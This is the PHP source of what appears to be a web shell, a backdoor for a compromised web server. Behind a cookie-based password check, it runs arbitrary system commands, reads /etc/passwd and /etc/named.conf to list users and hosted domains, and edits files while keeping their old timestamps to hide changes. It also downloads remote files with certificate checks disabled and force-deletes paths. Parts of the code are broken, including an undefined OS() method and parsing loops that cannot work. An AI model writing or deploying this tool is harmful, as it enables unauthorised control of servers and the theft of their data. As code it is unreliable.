<?php
$auth = new auth('$2y$10$PfttDQnvDLNwYeJGF.m.c.Caf/IJ5Sxx3OWcS7ehne2ghgdec3Eka');
class auth
{
	private $password;
	protected $cookie;
	protected $post;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	function __construct($password, $expired = null)
	{
		$this->password = $password;
		$this->cookie = $_COOKIE;
		$this->post = $_POST;
	}

	public function displayLogin()
	{
		?>
		<form method='post'>
			<input type='password'name='pass'>
		</form>
		<?php
	}

	public function login()
	{
		if(isset($this->password) && (trim($this->password) != '')){
			if(isset($this->post['pass'])){
				if (password_verify($this->post["pass"], $this->password)) {
					setcookie("pass", $this->password, time() + $this->expired[3], "/");
					header("Location: {$_SERVER['PHP_SELF']}");
				}
			}
			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $this->password)))){
				$this->displayLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["pass"])) {
			setcookie("pass", "", time() - 1);
			header("Location: {$_SERVER['PHP_SELF']}");
		}
	}
}


class listFiles
{
	protected $path;
	protected $result;
	protected $getExtensionFiles;
	
	function __construct()
	{
		$this->path = getcwd();
	}

	public function path()
	{
		return $this->path;
	}
	/*
	* @param: type(all|dir|file)
	*/
	public function list($type)
	{
		$this->result= [];
		foreach (scandir($this->path()) as $key => $value) {
			$filename = [
				"getPathname"	=> $this->path() . DIRECTORY_SEPARATOR . $value,
				"getName"		=> $value
			];

			switch ($type) {
				case 'all':
					if (is_dir($filename["getPathname"]));
					break;
				case "dir":
					if (!is_dir($filename["getPathname"]) || $value === "." || $value === "..") {
						continue 2;
					}
					break;
				
				case "file":
					if (!is_file($filename["getPathname"])) {
						continue 2;
					}
					break;
			}

			$this->result[] = $filename;
		} return $this->result;
	}

	public function mySelf()
	{
		return str_replace("/", "", $_SERVER['PHP_SELF']);
	}

	public function folders()
	{
		return $this->list("dir");
	}

	public function files()
	{
		return $this->list("file");
	}

	public function getExtension($filename)
	{
		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	}
	/*
	* @param: dir
	* @param: array
	*/
	public function listAll($dir, &$output = array())
	{
		foreach (scandir($dir) as $key => $value) {
			$location = $dir.DIRECTORY_SEPARATOR.$value;
			if (!is_dir($location)) {
				$output[] = $location;
			} elseif ($value != "." && $value != '..') {
				$this->listAll($location, $output);
				$output[] = $location;
			}
		} return $output;
	}
	/*
	* @param: dir
	* @param: file extension
	* @param: filename|filename
	*/
	public function listAllExtension($dir, $extension = null, $kecuali = "")
	{
		if (is_writable($dir)) {
			foreach ($this->listAll($dir) as $key => $value) {
				switch ($this->getExtension($value)) {
					case $extension:
						if (preg_match("/{$this->mySelf()}|{$kecuali}$/i", basename($value), $matches) === 0) {
							print($value . "<br>");
						}
						break;
				}
			}
		}
	}
}

/**
 * 
 */
class cd extends listFiles
{
	protected static $cd;
	function __construct($cd)
	{
		self::$cd = $cd;
		return self::cd(self::$cd);
	}

	public static function cd($directory)
	{
		return chdir($directory);
	}
}

/**
 * 
 */
class Tools
{
	protected $path, $name, $resource, $data = null, $cwd = null;
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
	}

	public function make($filename)
	{
		$this->resource = $filename;
		return $this;
	}

	public function path($path)
	{
		$this->cwd = $path;
		return $this;
	}

	public function dir()
	{
		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
	}

	public function file($data)
	{
		foreach ($this->resource as $key => $value) {
			$explode = explode("|", $this->resource[$key]);
			foreach ($explode as $i => $file) {
				file_put_contents($file, $data);
			}
		}
	}

	public function execute($command)
	{
		$command = $command;

		switch ($command) {
			case function_exists("system"):
				@ob_start();
				@system($command);
				$buff = @ob_get_contents(); 
				@ob_end_clean();
				return $buff; 	
				break;
			
			case function_exists("exec"):
				@exec($command, $result);
				$buff = "";
				foreach ($result as $key => $value) {
					$buff .= $value;
				} return $buff;
				break;

			case function_exists("passthru"):
				@ob_start();
				@passthru($command);
				$buff = @ob_get_contents();
				@ob_end_clean();
				return $buff;
				break;

			case function_exists("shell_exec"):
				$buff = @shell_exec($command);
				return $buff;
				break;
		}
	}

	public function getPasswd()
	{
		if ($this->OS() === "Linux") {
			return $this->execute("cat /etc/passwd");
		} else {
			return false;
		}
	}
}

class Action extends Tools
{
	protected $path, $filename;
	protected $handle;
	protected $modes = [
			"read"			=> "r",
			"write" 		=> "w",
			"writemaster"	=> "w+",
			"append"		=> "a",
			"readmaster"	=> "rb"
	];
	
	function __construct($filename = null)
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->filename = $filename;
	}

	public function getUser($filename = "/etc/passwd")
	{
		if (file_exists($filename)) {
			$this->handle = fopen($filename, $this->modes["read"]);
			while ($read = fgetc($this->handle)) {
				preg_match_all('/(.*?):x:/', $read, $matches);
				$user[] = $matches[1][0];
			} return $user;
		} else {
			return false;
		}
	}

	public function getDomian($filename = "/etc/named.conf")
	{
		if (file_exists($filename)) {
			$this->handle = fopen($filename, $this->modes["read"]);
			while ($read = fgetc($this->handle)) {
				preg_match_all("#/var/named/(.*?).db#", $read, $matches);
				$domian[] = $matches[1][0];
			} return $domian;
		} else {
			return false;
		}
	}

	public function isWIN(bool $bool)
	{
		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? $bool : $bool;
	}

	public function open($mode)
	{
		if (!empty(trim($this->filename))) {
			$this->handle = fopen($this->filename, $this->modes[$mode]);
			return $this;
		}
	}

	public function read()
	{
		return htmlspecialchars(file_get_contents($this->filename));
	}

	public function write($data)
	{
		fwrite($this->handle, $data);
		$ftime = filemtime($this->filename);
		if ($ftime === false) return false;
		return touch($this->filename, $ftime);
	}

	public function chname($newname)
	{
		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
	}

	public function chmode($mode)
	{
		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
	}

	public function validUrl($url)
	{
		if (preg_match("|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|", $url)) {
			return true;
		}
		if (preg_match('#^([a-z][\w-]+:(?:/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))$#', $url)) {
			$parts = parse_url($url);
			if (!in_array($parts["scheme"], array( 'http', 'https' ))) {
				return false;
			}
			if (!preg_match("|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|", $parts["host"])) {
				return false;
			}
			return true;
		}
		throw new Exception("Must be url", 1);
		
		return false;
	}

	public function download($url = null, $filename = null)
	{
		if (!$this->validUrl($url)) {
			$this->filename = trim($this->filename);
			if (is_file($this->filename)) {
				header("Content-Type: application/octet-stream");
				header('Content-Transfer-Encoding: binary');
				header("Content-length: ".filesize($this->filename));
				header("Cache-Control: no-cache");
				header("Pragma: no-cache");
				header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");
				while (!feof($this->handle)) {
					print(fread($this->handle, 1024*8));
					@ob_flush();
					@flush();
				}
				fclose($this->handle);
				die();
			}
		} else {
			$get = [
				"url" => $url,
				"filename" => $filename
			];

			$handle = fopen($get["filename"], "w+");
			$ch = curl_init();
				  curl_setopt($ch, CURLOPT_URL, $get["url"]);
				  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
				  curl_setopt($ch, CURLOPT_FILE, $handle);
			return curl_exec($ch);
				  curl_close($ch);
				  fclose($handle);
				  ob_flush();
				  flush();
		}
	}

	public function delete()
	{
		if (is_dir($this->filename)) {
			if (!@rmdir($this->filename) AND $this->isWIN(true)) $this->execute("rmdir /s /q {$this->filename}");
			if (!@rmdir($this->filename) AND $this->isWIN(false)) $this->execute("rm -rf {$this->filename}");
		} elseif (is_file($this->filename)) {
			if (!@unlink($this->filename) AND $this->isWIN(true)) $this->execute("del /f {$this->filename}");
			if (!@unlink($this->filename) AND $this->isWIN(false)) $this->execute("rm {$this->filename}");
		}
	}
}
